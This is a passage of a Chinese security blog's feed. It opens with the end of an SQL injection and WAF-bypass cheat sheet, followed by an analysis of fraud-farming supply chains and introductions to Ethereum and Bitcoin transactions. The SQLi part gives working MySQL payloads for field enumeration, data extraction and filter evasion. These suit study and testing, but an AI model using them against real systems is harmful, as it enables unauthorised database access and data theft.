* from freebuf as a join freebuf as b)as c);</span><br></pre></td></tr></table></figure></li></ol><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15341500322650.jpg)爆后面的字段<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from freebuf where id=1 and (select * from (select * from freebuf as a join freebuf as b using(id))as c);</span><br></pre></td></tr></table></figure>![](media/15335491010936/15341500679125.jpg)</code></pre><h3 id="3-5-4-八字节注入"><a href="#3-5-4-八字节注入" class="headerlink" title="3.5.4 八字节注入"></a>3.5.4 八字节注入</h3><p>这种注入的原理是在MySQL中字符串实际上作为八字节的DOUBLE类型来处理。</p><p>具体的举一个例子：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15341508518816.jpg" alt=""></p><p>如果需要获取的数据大于八字节，可以使用<code>substr()</code>来将数据分成分片：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15341510080235.jpg" alt=""></p><p>也就说<code>user()</code>最多有16个字符，那么现在解码就能看到我们需要获得的数据：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15341511221900.jpg" alt=""></p><h3 id="3-5-5-局部变量的使用"><a href="#3-5-5-局部变量的使用" class="headerlink" title="3.5.5 局部变量的使用"></a>3.5.5 局部变量的使用</h3><p>为什么要使用局部变量呢？其实使用局部变量就是为了更改SQL语句的逻辑，比如针对于语义的waf过滤了<code>union select from</code>，那么就可以使用局部变量将语义更改为<code>select from union</code>，从而绕过逻辑判断。</p><p>举个例子：</p><p>过滤了如下的逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select title from freebuf where id=-1 union select table_name from information_schema.tables where table_schema=database() limit 0,1;</span><br></pre></td></tr></table></figure><p>可以看到这里的逻辑为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select from</span><br></pre></td></tr></table></figure><p>利用局部变量可以更改这样的逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select title from freebuf where id=1|@payload:=(select table_name from information_schema.tables where table_schema=database() limit 0,1) union select @payload;</span><br></pre></td></tr></table></figure><p>这样的逻辑为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select from union</span><br></pre></td></tr></table></figure><p>而且结果相同：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15341536397391.jpg" alt=""></p><h3 id="3-5-6-emoji"><a href="#3-5-6-emoji" class="headerlink" title="3.5.6 emoji"></a>3.5.6 emoji</h3><p>这一点不多说，因为我自己没搞清楚，推荐<a href="https://xz.aliyun.com/t/368" target="_blank" rel="noopener">从容师傅的文章</a></p><h1 id="0x04-Desserts（甜点）"><a href="#0x04-Desserts（甜点）" class="headerlink" title="0x04 Desserts（甜点）"></a>0x04 Desserts（甜点）</h1><p>这里不说具体案例，只说一说思路。</p><h2 id="4-1-其他的绕过思路"><a href="#4-1-其他的绕过思路" class="headerlink" title="4.1 其他的绕过思路"></a>4.1 其他的绕过思路</h2><p>MySQL是满足图灵完备的，也就是说只要能找到具备循环和判断的，且未被过滤的函数，理论上是可以完成所有正常功能的。并且在不限制字段的情况下，是可以利用可用函数进行编程来完成你想要的自定义查询的。</p><h2 id="4-2-逻辑很重要"><a href="#4-2-逻辑很重要" class="headerlink" title="4.2 逻辑很重要"></a>4.2 逻辑很重要</h2><p>测waf得时候可以首先想一下waf的判别逻辑，最常见的测试为以下三种逻辑的测试：</p><ul><li>union+select</li><li>select+from</li><li>union+from</li></ul><p>利用前文的局部变量来更改逻辑，说不定会有更好的效果。在了解了过滤逻辑的情况下，绕过剩下的过滤就好说多了。</p><h2 id="4-3-见招拆招"><a href="#4-3-见招拆招" class="headerlink" title="4.3 见招拆招"></a>4.3 见招拆招</h2><p><code>%23%0a</code>被过滤了，那么<code>%2d%2d%0a</code>是否会被过滤呢？</p><p>过滤了<code>union、from</code>，那么<code>1e1union</code>是否被过滤了？<code>.1from</code>是否被过滤了呢？</p><p>下面说一个分析场景：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union+select拦截</span><br><span class="line">select+from拦截</span><br><span class="line">union+from不拦截</span><br></pre></td></tr></table></figure><p>可以看到关键点在于<code>select</code>。</p><p>那么现在想一想下面的问题：</p><ul><li><code>union+select</code>过滤了，那么<code>union/*!50000%0aselect%0aall*/</code>呢？</li><li>如果<code>select</code>被识别了，那么<code>select all</code>、<code>select distinct</code>、<code>select distinctrow</code>呢？</li><li>如果<code>union/*!50000%0aselect%0aall*/</code>被过滤了，那fuzz一下<code>50000</code>这个五位数呢？</li></ul><p>你看可以从这一点看到这么多，再结合前文说的各种方法，不愁没办法。细心是最重要的。</p><h2 id="4-4-非惯性思维"><a href="#4-4-非惯性思维" class="headerlink" title="4.4 非惯性思维"></a>4.4 非惯性思维</h2><ul><li>waf在检测时，对不同的访问方式利用不同的规则进行检测，而这就有可能钻空子。</li><li>对waf进行长度检测，过长的字符串可能导致waf跳过识别，也有可能直接导致服务器宕机。</li></ul><h1 id="0x05-Coffee-Or-Tea"><a href="#0x05-Coffee-Or-Tea" class="headerlink" title="0x05 Coffee Or Tea"></a>0x05 Coffee Or Tea</h1><p>总结了这么多，也算是把各家的姿势还有自己的一点认识写完了（其实大部分还是学习各位师傅的姿势）。为了总结这一份cookbook，也算是花了快一周多的时间，主要参考了以下的文章：</p><ul><li><a href="https://xz.aliyun.com/t/368" target="_blank" rel="noopener">https://xz.aliyun.com/t/368</a></li><li><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></li><li><a href="https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html</a></li><li><a href="http://blog.51cto.com/wt7315/1891458" target="_blank" rel="noopener">http://blog.51cto.com/wt7315/1891458</a></li><li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/ModSecurity-SQL-Injection-Challenge--Lessons-Learned/" target="_blank" rel="noopener">https://www.trustwave.com/Resources/SpiderLabs-Blog/ModSecurity-SQL-Injection-Challenge–Lessons-Learned/</a></li></ul><p>本文长期更新，有新的姿势就会添加进来。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于SQLi的一点总结，用于自查。&lt;/p&gt;
    
    </summary>
    
      <category term="技术总结" scheme="https://lucifaer.com/categories/%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="CookBook" scheme="https://lucifaer.com/tags/CookBook/"/>
    
      <category term="SQL注入" scheme="https://lucifaer.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>薅羊毛产业链分析</title>
    <link href="https://lucifaer.com/2018/07/19/%E8%96%85%E7%BE%8A%E6%AF%9B%E4%BA%A7%E4%B8%9A%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/07/19/薅羊毛产业链分析/</id>
    <published>2018-07-19T07:19:09.000Z</published>
    <updated>2018-11-29T09:28:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>羊毛党会根据不同的业务情况使用不同方法完成相应的工作。下面举例两个较为不同的场景来简要的说一下薅羊毛的产业链。</p><a id="more"></a><h1 id="0x01-批量注册"><a href="#0x01-批量注册" class="headerlink" title="0x01 批量注册"></a>0x01 批量注册</h1><p>大致的流程如下图</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E6%89%B9%E9%87%8F%E6%B3%A8%E5%86%8C.png" alt="批量注册"></p><p>接下来粗略谈一下其中的各个环节。</p><h2 id="1-手机卡商"><a href="#1-手机卡商" class="headerlink" title="1. 手机卡商"></a>1. 手机卡商</h2><p>手机卡商属于整个产业链最上游的群体，数量众多的卡商们，手中拥有着大量的手机卡，为各大接码平台提供源源不断的号码服务，在风控领域中被称作“虚拟号码”。</p><p>卡商主要做两个事情，一个是用猫池养卡，二是将短信验证码发给打码平台。</p><p>猫池简单来说就是模拟成手机终端的设备，将猫池连接到PC上后，可以利用猫池软件对手机卡进行管理，主要功能包括：设置通道对应的手机号、自动读取短信、发送短信、拨打指定号码、批量设置呼叫转移等。猫池也同时充当养卡的平台，使运营商系统上显示这些卡为开机状态，从而能使这些卡正常工作。</p><p>通过猫池配合接码人员或机器学习的配合，可以完成一个系统化的接码平台，即在进行注册的时候自动接收手机短信或验证码信息，并将验证码提取出来。这样就完成了整个产业链的第一步。</p><h2 id="2-打码平台"><a href="#2-打码平台" class="headerlink" title="2. 打码平台"></a>2. 打码平台</h2><p>打码平台是整个产业链中最为关键的一环，可以说打码平台的进步使得薅羊毛的产业链成本越来越低。</p><p>打码平台接收接码平台中的验证码信息，利用深度学习或人工识别的方法，完成验证码的批量识别。这样就能过掉人机识别，完成正常的注册。</p><h2 id="3-羊毛党的后续工作"><a href="#3-羊毛党的后续工作" class="headerlink" title="3. 羊毛党的后续工作"></a>3. 羊毛党的后续工作</h2><p>羊毛党从中间商购买自动化打码工具，并准备批量注册工具以及自动薅羊毛的工具，就可以针对目标商家完成全自动的薅羊毛流程。在获取到大量的资源后，利用不同的变现手段如：淘宝、咸鱼、各种群，将这些资源卖出去后，就实现了营收。 </p><h1 id="0x02-刷量"><a href="#0x02-刷量" class="headerlink" title="0x02 刷量"></a>0x02 刷量</h1><p>大致的流程如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E5%88%B7%E9%87%8F.png" alt="刷量"></p><h2 id="1-改机工具"><a href="#1-改机工具" class="headerlink" title="1. 改机工具"></a>1. 改机工具</h2><p>改机工具是通过劫持系统函数来对设备信息进行篡改，来绕过风控策略。在运行改机工具时需要首先对设备进行root（或者越狱）。主要是使用这么几种方法：</p><ul><li>Android hook<br>  Android改机工具大部分是基于xposed框架做的插件，通过HOOK方式修改IMEI，IMSI，手机号，MAC地址，手机硬件信息，地理位置，安装包列表等</li><li>IOS hook<br>  主要是基于cydia框架做的插件，通过HOOK修改设备参数。一些高级的工具还提供了多开和一件新机功能。</li><li><p>Android模拟器</p><p>  并不算真正的改机工具</p></li></ul><p>看到一些资料说黑产对hook检测的对抗已经转向自定制ROM的Android模拟器，会集成一键新机功能，每次启动所有的系统参数都会随机变化。更为难以识别。</p><h2 id="2-按键精灵"><a href="#2-按键精灵" class="headerlink" title="2. 按键精灵"></a>2. 按键精灵</h2><p>通过lua编写的脚本来回放用户的触摸痕迹和输入操作。在风控时是比较难以识别的。</p><h2 id="3-群控系统"><a href="#3-群控系统" class="headerlink" title="3. 群控系统"></a>3. 群控系统</h2><p>群控系统简单来说是利用PC来管理真机，并模仿真人自动完成相应的操作。群控系统一般用来配合卡商完成较大规模的产业化的工作。一般围绕微信的营销展开，进行微商的推广等操作，赚取营销毛利。</p><p>当群控系统、改机工具和按键精灵结合到一起的时候，对于平台来说就是灾难性的。配合到上文所说的接码平台，能够大幅度的提升薅羊毛的效率和成功率。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;羊毛党会根据不同的业务情况使用不同方法完成相应的工作。下面举例两个较为不同的场景来简要的说一下薅羊毛的产业链。&lt;/p&gt;
    
    </summary>
    
      <category term="黑产研究" scheme="https://lucifaer.com/categories/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="黑产研究" scheme="https://lucifaer.com/tags/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
      <category term="薅羊毛" scheme="https://lucifaer.com/tags/%E8%96%85%E7%BE%8A%E6%AF%9B/"/>
    
  </entry>
  
  <entry>
    <title>以太坊简介</title>
    <link href="https://lucifaer.com/2018/06/18/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%AE%80%E4%BB%8B/"/>
    <id>https://lucifaer.com/2018/06/18/以太坊简介/</id>
    <published>2018-06-18T12:08:44.000Z</published>
    <updated>2018-08-09T02:36:58.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以太坊的目的是基于脚本、竞争币和链上元协议（on-chain meta-protocol）概念进行整合和提高，使得开发者能够创建任意的基于共识的、可扩展的、标准化的、特性完备的、易于开发的和协同的应用。以太坊通过建立终极的抽象的基础层-内置有图灵完备编程语言的区块链-使得任何人都能够创建合约和去中心化应用并在其中设立他们自由定义的所有权规则、交易方式和状态转换函数。域名币的主体框架只需要两行代码就可以实现，诸如货币和信誉系统等其它协议只需要不到二十行代码就可以实现。智能合约-包含价值而且只有满足某些条件才能打开的加密箱子-也能在我们的平台上创建，并且因为图灵完备性、价值知晓（value-awareness）、区块链知晓（blockchain-awareness）和多状态所增加的力量而比比特币脚本所能提供的智能合约强大得多。</p></blockquote><p>上面是以太坊白皮书上对以太坊的介绍，其实简单来说，以太坊就是一个框架，利用这个框架开发出的应用叫智能合约。</p><a id="more"></a><h1 id="0x00-以太坊账户"><a href="#0x00-以太坊账户" class="headerlink" title="0x00 以太坊账户"></a>0x00 以太坊账户</h1><p>在以太坊系统中，状态是由被称为“账户”（每个账户是一个20字节的地址）的对象和在两个账户之间转移价值和信息的状态转换系统构成的。“账户”包含四个部分：</p><ul><li>随机数，用于确定每笔交易只能被处理一次的计数器</li><li>账户目前的以太币余额</li><li>账户的合约代码，如果有的话</li><li>账户的存储（默认为空）</li></ul><p>以太币（Ether）是以太坊内部的主要加密燃料，用于支付交易费用。一般而言，以太坊有两种类型的账户：外部所有的账户（由私钥控制的）和合约账户（由合约代码控制）。</p><p>外部账户可以简单理解为使用服务的用户，合约用户可以简单理解为提供服务的内部工作人员。</p><p>外部所有的账户没有代码，人们可以通过创建和签名一笔交易从一个外部账户发送消息。每当合约账户收到一条消息，合约内部的代码就会被激活，允许它对内部存储进行读取和写入，和发送其它消息或者创建合约。</p><h1 id="0x01-以太坊的消息"><a href="#0x01-以太坊的消息" class="headerlink" title="0x01 以太坊的消息"></a>0x01 以太坊的消息</h1><p>以太坊的消息在某种程度上和比特币交易很像，区别在于以下三点：</p><ul><li>以太坊的消息可以由外部实体或者合约创建，然而比特币的交易只能从外部创建。</li><li>以太坊消息可以选择包含数据。</li><li>如果以太坊消息的接受者是合约账户，可以选择进行回应，这意味着以太坊消息也包含函数概念。</li></ul><h1 id="0x02-以太坊的交易"><a href="#0x02-以太坊的交易" class="headerlink" title="0x02 以太坊的交易"></a>0x02 以太坊的交易</h1><p>这部分我觉得干说不是很形象，用从论坛中的一位大哥的代码分析来形象的说明一下。首先要明确的一点，以太坊上的应用都是通过智能合约与区块链进行交互的，而只能合约的执行是由交易触发的，可以说在以太坊中，一切都源于交易。源码在<a href="https://github.com/ethereum" target="_blank" rel="noopener">https://github.com/ethereum</a>。想看的话可以自己跟着<a href="https://blog.csdn.net/omnispace/article/details/79311891" target="_blank" rel="noopener">这篇文章</a>看。</p><h2 id="1-以太坊交易的数据结构"><a href="#1-以太坊交易的数据结构" class="headerlink" title="1. 以太坊交易的数据结构"></a>1. 以太坊交易的数据结构</h2><p>在<code>core/types/transaction.go</code>中有交易的数据结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Transaction <span class="keyword">struct</span> &#123;</span><br><span class="line">data txdata</span><br><span class="line"><span class="comment">// caches</span></span><br><span class="line">hash atomic.Value</span><br><span class="line">size atomic.Value</span><br><span class="line">from atomic.Value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到只有<code>data</code>一个字段，其他三个字段都是缓存字段。<code>txdata</code>也是一个结构体，就在这段代码的下面：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> txdata <span class="keyword">struct</span> &#123;</span><br><span class="line">AccountNonce <span class="keyword">uint64</span>          <span class="string">`json:"nonce"    gencodec:"required"`</span></span><br><span class="line">Price        *big.Int        <span class="string">`json:"gasPrice" gencodec:"required"`</span></span><br><span class="line">GasLimit     <span class="keyword">uint64</span>          <span class="string">`json:"gas"      gencodec:"required"`</span></span><br><span class="line">Recipient    *common.Address <span class="string">`json:"to"       rlp:"nil"`</span> <span class="comment">// nil means contract creation</span></span><br><span class="line">Amount       *big.Int        <span class="string">`json:"value"    gencodec:"required"`</span></span><br><span class="line">Payload      []<span class="keyword">byte</span>          <span class="string">`json:"input"    gencodec:"required"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Signature values</span></span><br><span class="line">V *big.Int <span class="string">`json:"v" gencodec:"required"`</span></span><br><span class="line">R *big.Int <span class="string">`json:"r" gencodec:"required"`</span></span><br><span class="line">S *big.Int <span class="string">`json:"s" gencodec:"required"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This is only used when marshaling to JSON.</span></span><br><span class="line">Hash *common.Hash <span class="string">`json:"hash" rlp:"-"`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先解释一下注释中的内容来源。以太坊会向外部提供JSON RPC服务，供外部调用，RPC服务通过json格式传输数据，节点接收到json数据后会转换成内部的数据结构来使用。两种数据结构转换的方法是利用json的序列化（<code>MarshalJSON</code>）和反序列化（<code>UnmarshalJSON</code>）来完成的。而注释的内容就是内部结构体与json数据各字段的对应关系。</p><p>为什么要使用json来进行通讯呢？因为web3.js中的<code>eth.getTransaction()</code>和<code>eth.sendTransaction()</code>使用的数据就是json格式的。</p><p>接下来解释一下各字段的意思，其实大部分我们都能看懂：</p><ul><li><code>AccountNonce</code>：此交易的发送者已发送过的交易数。</li><li><code>Price</code>：此交易的gas price</li><li><code>GasLimit</code>：本交易允许消耗的最大gas数量</li><li><code>Recipient</code>：交易的接收者，是一个地址</li><li><code>Amount</code>：交易转移的以太币数量，单位是wei</li><li><code>Payload</code>：交易可以携带的数据，在不同类型的交易中有不同的含义</li><li><code>V R S</code>：交易的签名数据</li></ul><p>这里出现了一个gas新名词，其实gas就相当于运行合约的手续费。gas的数量是由合约的复杂性来确定的，当然gas也是矿工在运行时所收取的“工资”。gas主要是用来先知执行交易所需要的工作量，无论运行到什么时候，只要gas被耗尽，就会触发异常，所有的状态修改帧都会回滚，这样就防止有人写出无法停止的合约来阻塞网络。</p><p>这里并没有一个字段来指明交易的发送者，因为交易的发送者地址可以从签名中得到。</p><p>Payload这个字段在<code>eth.sendTransaction()</code>中对应的是data字段，在<code>eth.getTransaction()</code>中对应的是input字段。</p><h2 id="2-交易的哈希计算"><a href="#2-交易的哈希计算" class="headerlink" title="2. 交易的哈希计算"></a>2. 交易的哈希计算</h2><p>下面是计算交易Hash的函数，它是先从缓存<code>tx.hash</code>中取，如果取到，就直接返回，如果缓存中没有，就调用<code>rlpHash</code>计算hash，然后把hash值加入到缓存中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hash hashes the RLP encoding of tx.</span></span><br><span class="line"><span class="comment">// It uniquely identifies the transaction.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tx *Transaction)</span> <span class="title">Hash</span><span class="params">()</span> <span class="title">common</span>.<span class="title">Hash</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> hash := tx.hash.Load(); hash != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> hash.(common.Hash)</span><br><span class="line">&#125;</span><br><span class="line">v := rlpHash(tx)</span><br><span class="line">tx.hash.Store(v)</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>rlpHash</code>代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rlpHash</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span> <span class="params">(h common.Hash)</span></span> &#123;</span><br><span class="line">hw := sha3.NewKeccak256()</span><br><span class="line">rlp.Encode(hw, x)</span><br><span class="line">hw.Sum(h[:<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> h</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<code>rlpHash</code>函数可以看出，计算hash的方法是先对交易进行<a href="https://my.oschina.net/u/2349981/blog/894117" target="_blank" rel="noopener">RLP编码</a>，然后计算RLP编码数据的hash，具体的hash算法是<code>Keccak256</code>。</p><p>而进行哈希计算的字段在<code>rlp.Encode</code>的注释中有所提及：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If the type implements the Encoder interface, Encode calls</span></span><br><span class="line"><span class="comment">// EncodeRLP. This is true even for nil pointers, please see the</span></span><br><span class="line"><span class="comment">// documentation for Encoder.</span></span><br></pre></td></tr></table></figure><p>如果一个类型实现了<code>Encoder</code>接口，那么<code>Encode</code>函数就会调用那个类型所实现的<code>EncodeRLP</code>函数。所以我们就要看<code>Transaction</code>这个结构体是否实现了<code>EncodeRLP</code>函数。回到<code>core/types/transaction.go</code>中，可以看到<code>Transaction</code>确实实现了<code>EncodeRLP</code>函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DecodeRLP implements rlp.Encoder</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tx *Transaction)</span> <span class="title">EncodeRLP</span><span class="params">(w io.Writer)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> rlp.Encode(w, &amp;tx.data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这可以看出交易的hash实际上是对<code>tx.data</code>进行hash计算得到的：<code>txhash=Keccak256(rlpEncode(tx.data))</code>。</p><h1 id="0x03-交易的类型"><a href="#0x03-交易的类型" class="headerlink" title="0x03 交易的类型"></a>0x03 交易的类型</h1><p>在源码中交易只有一种数据结构，就是在web3.js中定义的发送交易的接口，而根据接口的三种不同使用方法，可以大致将交易分为三种：转账交易、创建合约交易、执行合约交易。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sendTransaction(transactionObject [, callback])</span><br></pre></td></tr></table></figure><h2 id="1-转账交易"><a href="#1-转账交易" class="headerlink" title="1. 转账交易"></a>1. 转账交易</h2><p>转账是最简单的一种交易，这里转账是指从一个账户向另一个账户发送以太币。发送转账交易的时候只需要指定交易的发送者、接收者、转币的数量。使用web3.js发送转账交易应该像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    from: &quot;0xb60e8dd61c5d32be8058bb8eb970870f07233155&quot;,</span><br><span class="line">    to: &quot;0xd46e8dd67c5d32be8058bb8eb970870f07244567&quot;,</span><br><span class="line">    value: 10000000000000000</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>value是转移的以太币数量，单位是<code>wei</code>，对应的是源码中的<code>Amount</code>字段。<code>to</code>对应的是源码中的<code>Recipient</code>。</p><h2 id="2-创建合约的交易"><a href="#2-创建合约的交易" class="headerlink" title="2. 创建合约的交易"></a>2. 创建合约的交易</h2><p>创建合约指的是将合约部署到区块链上，这也是通过发送交易来实现。在创建合约的交易中，<code>to</code>字段要留空不填，在<code>data</code>字段中指定合约的二进制代码，<code>from</code>字段是交易的发送者也是合约的创建者。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    from: &quot;contract creator&apos;s address&quot;,</span><br><span class="line">    data: &quot;contract binary code&quot;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>data</code>字段对应的是源码中的<code>Payload</code>字段。</p><h2 id="3-执行合约的交易"><a href="#3-执行合约的交易" class="headerlink" title="3. 执行合约的交易"></a>3. 执行合约的交易</h2><p>调用合约中的方法，需要将交易的<code>to</code>字段指定为要调用的合约的地址，通过<code>data</code>字段指定要调用的方法以及向该方法传递的参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    from: &quot;sender&apos;s address&quot;,</span><br><span class="line">    to: &quot;contract address&quot;,</span><br><span class="line">    data: &quot;hash of the invoked method signature and encoded parameters&quot;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>data</code>字段需要特殊的编码规则，具体细节可以参考<a href="https://github.com/ethereum/wiki/wiki/Ethereum-Contract-ABI" target="_blank" rel="noopener">Ethereum Contract ABI</a>。自己拼接字段既不方便又容易出错，所以一般都使用封装好的SDK（比如web3.js）来调用合约。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;以太坊的目的是基于脚本、竞争币和链上元协议（on-chain meta-protocol）概念进行整合和提高，使得开发者能够创建任意的基于共识的、可扩展的、标准化的、特性完备的、易于开发的和协同的应用。以太坊通过建立终极的抽象的基础层-内置有图灵完备编程语言的区块链-使得任何人都能够创建合约和去中心化应用并在其中设立他们自由定义的所有权规则、交易方式和状态转换函数。域名币的主体框架只需要两行代码就可以实现，诸如货币和信誉系统等其它协议只需要不到二十行代码就可以实现。智能合约-包含价值而且只有满足某些条件才能打开的加密箱子-也能在我们的平台上创建，并且因为图灵完备性、价值知晓（value-awareness）、区块链知晓（blockchain-awareness）和多状态所增加的力量而比比特币脚本所能提供的智能合约强大得多。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面是以太坊白皮书上对以太坊的介绍，其实简单来说，以太坊就是一个框架，利用这个框架开发出的应用叫智能合约。&lt;/p&gt;
    
    </summary>
    
      <category term="blockchain" scheme="https://lucifaer.com/categories/blockchain/"/>
    
    
      <category term="blockchain" scheme="https://lucifaer.com/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>比特币简介</title>
    <link href="https://lucifaer.com/2018/06/18/%E6%AF%94%E7%89%B9%E5%B8%81%E7%AE%80%E4%BB%8B/"/>
    <id>https://lucifaer.com/2018/06/18/比特币简介/</id>
    <published>2018-06-18T10:57:44.000Z</published>
    <updated>2018-11-29T09:28:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>本篇重点不放在科普比特币上，重点放在比特币交易的整个生命周期上。</p><p>比特币是基于分布式网络的数字货币，当然也可以说是基于区块链网络的数字货币。比特币的核心是基于<strong>非对称加密</strong>来的，<strong>非对称加密保证了支付的可靠性</strong>。而比特币钱包其实就是你的<strong>公私钥对</strong>，交易时你只需要把钱包地址交给别人即可，别人用你的公钥加密比特币，发送到你的地址就完成了交易，而你的钱包地址是由你自己的私钥证明的，所以你丢了私钥，就丢掉了你的钱包。</p><a id="more"></a><h1 id="0x00-简述比特币的交易过程"><a href="#0x00-简述比特币的交易过程" class="headerlink" title="0x00 简述比特币的交易过程"></a>0x00 简述比特币的交易过程</h1><p>首先在交易发起时，转出比特币的一方提供以下数据：</p><ul><li>上一笔交易的 Hash（你从哪里得到这些比特币）</li><li>本次交易双方的地址</li><li>支付方的公钥</li><li>支付方的私钥生成的数字签名</li></ul><p>验证这笔交易是否属实，只要经过三步检查即可：</p><ul><li>第一步，找到上一笔交易，确认支付方的比特币来源。</li><li>第二步，算出支付方公钥的指纹，确认与支付方的地址一致，从而保证公钥属实。</li><li>第三步，使用公钥去解开数字签名，保证私钥属实。</li></ul><p>确认交易真实性后，将交易数据传送给矿工，矿工将交易数据写入区块链中，就完成了交易。</p><h1 id="0x01-比特币交易细节"><a href="#0x01-比特币交易细节" class="headerlink" title="0x01 比特币交易细节"></a>0x01 